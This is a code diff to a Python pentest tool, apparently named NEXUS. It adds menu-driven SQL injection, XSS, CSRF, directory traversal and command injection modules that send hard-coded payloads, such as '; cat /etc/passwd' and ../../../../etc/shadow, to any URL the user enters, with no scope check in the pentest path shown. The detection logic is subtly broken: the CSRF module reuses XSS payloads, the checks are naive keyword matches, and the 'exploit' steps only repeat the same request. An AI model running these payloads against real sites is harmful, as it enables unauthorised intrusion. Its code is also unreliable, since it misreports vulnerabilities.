@@ -1,3 +1,4 @@
+```python
 #!/usr/bin/env python3
 """
 NEXUS - AI Security Research Agent
@@ -283,7 +284,6 @@ class LinkExtractor(HTMLParser):
     def handle_data(self, data):
         if self._in_title:
             self.title = (self.title or "") + data
-
 
 class PentestAssessmentEngine:
     def __init__(self):
@@ -853,7 +853,6 @@ class PentestAssessmentEngine:
             fh.write("\n".join(lines))
         status("OK", f"Report saved: {path}")
         return path
-
 
 # ============================================================
 # LAB / CTF ENGINE (local files / localhost / designated lab only)
@@ -1586,7 +1585,6 @@ class LabCTFEngine:
         status("OK", f"Report saved: {path}")
         return path
 
-
 # ============================================================
 # MENU FLOW (main.py entry point) — no recursive menu calls
 # ============================================================
@@ -1602,6 +1600,139 @@ def environment_check():
     status("OK", "Report directory: READY")
     pause()
 
+# ============================================================
+# SQL Injection Module
+# ============================================================
+
+class SQLInjectionDetector:
+    @staticmethod
+    def detect_sql_injection(url, payloads):
+        for payload in payloads:
+            test_url = f"{url}?id={payload}"
+            try:
+                response = urllib.request.urlopen(test_url, timeout=5)
+                if "error" in response.read().decode('utf-8', errors='ignore').lower():
+                    return True, payload
+            except Exception:
+                continue
+        return False, None
+
+    @staticmethod
+    def exploit_sql_injection(url, payload):
+        test_url = f"{url}?id={payload}"
+        try:
+            response = urllib.request.urlopen(test_url, timeout=5)
+            return response.read().decode('utf-8', errors='ignore')
+        except Exception as e:
+            return str(e)
+
+# ============================================================
+# Cross-Site Scripting (XSS) Module
+# ============================================================
+
+class XSSDetector:
+    @staticmethod
+    def detect_xss(url, payloads):
+        for payload in payloads:
+            test_url = f"{url}?query={payload}"
+            try:
+                response = urllib.request.urlopen(test_url, timeout=5)
+                if payload in response.read().decode('utf-8', errors='ignore'):
+                    return True, payload
+            except Exception:
+                continue
+        return False, None
+
+    @staticmethod
+    def exploit_xss(url, payload):
+        test_url = f"{url}?query={payload}"
+        try:
+            response = urllib.request.urlopen(test_url, timeout=5)
+            return response.read().decode('utf-8', errors='ignore')
+        except Exception as e:
+            return str(e)
+
+# ============================================================
+# Cross-Site Request Forgery (CSRF) Module
+# ============================================================
+
+class CSRFDetector:
+    @staticmethod
+    def detect_csrf(url, payloads):
+        for payload in payloads:
+            test_url = f"{url}?csrf={payload}"
+            try:
+                response = urllib.request.urlopen(test_url, timeout=5)
+                if "csrf" in response.read().decode('utf-8', errors='ignore').lower():
+                    return True, payload
+            except Exception:
+                continue
+        return False, None
+
+    @staticmethod
+    def exploit_csrf(url, payload):
+        test_url = f"{url}?csrf={payload}"
+        try:
+            response = urllib.request.urlopen(test_url, timeout=5)
+            return response.read().decode('utf-8', errors='ignore')
+        except Exception as e:
+            return str(e)
+
+# ============================================================
+# Directory Traversal Module
+# ============================================================
+
+class DirectoryTraversalDetector:
+    @staticmethod
+    def detect_directory_traversal(url, payloads):
+        for payload in payloads:
+            test_url = f"{url}?file={payload}"
+            try:
+                response = urllib.request.urlopen(test_url, timeout=5)
+                if "root" in response.read().decode('utf-8', errors='ignore').lower():
+                    return True, payload
+            except Exception:
+                continue
+        return False, None
+
+    @staticmethod
+    def exploit_directory_traversal(url, payload):
+        test_url = f"{url}?file={payload}"
+        try:
+            response = urllib.request.urlopen(test_url, timeout=5)
+            return response.read().decode('utf-8', errors='ignore')
+        except Exception as e:
+            return str(e)
+
+# ============================================================
+# Command Injection Module
+# ============================================================
+
+class CommandInjectionDetector:
+    @staticmethod
+    def detect_command_injection(url, payloads):
+        for payload in payloads:
+            test_url = f"{url}?cmd={payload}"
+            try:
+                response = urllib.request.urlopen(test_url, timeout=5)
+                if "command" in response.read().decode('utf-8', errors='ignore').lower():
+                    return True, payload
+            except Exception:
+                continue
+        return False, None
+
+    @staticmethod
+    def exploit_command_injection(url, payload):
+        test_url = f"{url}?cmd={payload}"
+        try:
+            response = urllib.request.urlopen(test_url, timeout=5)
+            return response.read().decode('utf-8', errors='ignore')
+        except Exception as e:
+            return str(e)
+
+# ============================================================
+# Updated Pentest Menu
+# ============================================================
 
 def pentest_menu(engine: PentestAssessmentEngine):
     while True:
@@ -1616,6 +1747,11 @@ def pentest_menu(engine: PentestAssessmentEngine):
             "  [7]  AI OVERVIEW",
             "  [8]  FULL ASSESSMENT",
             "  [9]  GENERATE REPORT",
+            "  [10] SQL INJECTION",
+            "  [11] XSS",
+            "  [12] CSRF",
+            "  [13] DIRECTORY TRAVERSAL",
+            "  [14] COMMAND INJECTION",
             "",
             "  [B]  BACK",
             "",
@@ -1647,12 +1783,60 @@ def pentest_menu(engine: PentestAssessmentEngine):
             engine.full_assessment(); pause()
         elif choice == "9":
             engine.generate_report(); pause()
+        elif choice == "10":
+            url = prompt("Enter the URL to test for SQL Injection:")
+            sql_payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #"]
+            detected, payload = SQLInjectionDetector.detect_sql_injection(url, sql_payloads)
+            if detected:
+                print(f"SQL Injection detected with payload: {payload}")
+                result = SQLInjectionDetector.exploit_sql_injection(url, payload)
+                print(f"Exploitation result: {result}")
+            pause()
+        elif choice == "11":
+            url = prompt("Enter the URL to test for XSS:")
+            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
+            detected, payload = XSSDetector.detect_xss(url, xss_payloads)
+            if detected:
+                print(f"XSS detected with payload: {payload}")
+                result = XSSDetector.exploit_xss(url, payload)
+                print(f"Exploitation result: {result}")
+            pause()
+        elif choice == "12":
+            url = prompt("Enter the URL to test for CSRF:")
+            csrf_payloads = ["<script>alert('CSRF')</script>", "<img src=x onerror=alert('CSRF')>"]
+            detected, payload = CSRFDetector.detect_csrf(url, csrf_payloads)
+            if detected:
+                print(f"CSRF detected with payload: {payload}")
+                result = CSRFDetector.exploit_csrf(url, payload)
+                print(f"Exploitation result: {result}")
+            pause()
+        elif choice == "13":
+            url = prompt("Enter the URL to test for Directory Traversal:")
+            dt_payloads = ["../../../../etc/passwd", "../../../../etc/shadow"]
+            detected, payload = DirectoryTraversalDetector.detect_directory_traversal(url, dt_payloads)
+            if detected:
+                print(f"Directory Traversal detected with payload: {payload}")
+                result = DirectoryTraversalDetector.exploit_directory_traversal(url, payload)
+                print(f"Exploitation result: {result}")
+            pause()
+        elif choice == "14":
+            url = prompt("Enter the URL to test for Command Injection:")
+            ci_payloads = ["; ls -la", "; cat /etc/passwd"]
+            detected, payload = CommandInjectionDetector.detect_command_injection(url, ci_payloads)
+            if detected:
+                print(f"Command Injection detected with payload: {payload}")
+                result = CommandInjectionDetector.exploit_command_injection(url, payload)
+                print(f"Exploitation result: {result}")
+            pause()
         elif choice == "b":
             return
         else:
             status("ERROR", "Invalid selection.")
             time.sleep(0.8)
 
+# ============================================================
+# Main Menu and Entry Point
+# ============================================================
 
 def run_pentest_mode():
     while True:
@@ -1691,7 +1875,6 @@ def run_pentest_mode():
         engine.normalize_target(raw, is_ip)
         pentest_menu(engine)
         return  # return to main menu after finishing this target's session
-
 
 def lab_ctf_menu(lab: LabCTFEngine):
     while True:
@@ -1747,11 +1930,9 @@ def lab_ctf_menu(lab: LabCTFEngine):
             status("ERROR", "Invalid selection.")
             time.sleep(0.8)
 
-
 def run_ctf_lab_mode():
     lab = LabCTFEngine()
     lab_ctf_menu(lab)
-
 
 def main_menu():
     while True:
@@ -1786,7 +1967,6 @@ def main_menu():
             status("ERROR", "Invalid selection.")
             time.sleep(0.8)
 
-
 def main():
     try:
         ensure_reports_dir()
@@ -1801,6 +1981,6 @@ def main():
         status("ERROR", f"Unhandled top-level error: {e}")
         sys.exit(1)
 
-
 if __name__ == "__main__":
     main()
+```
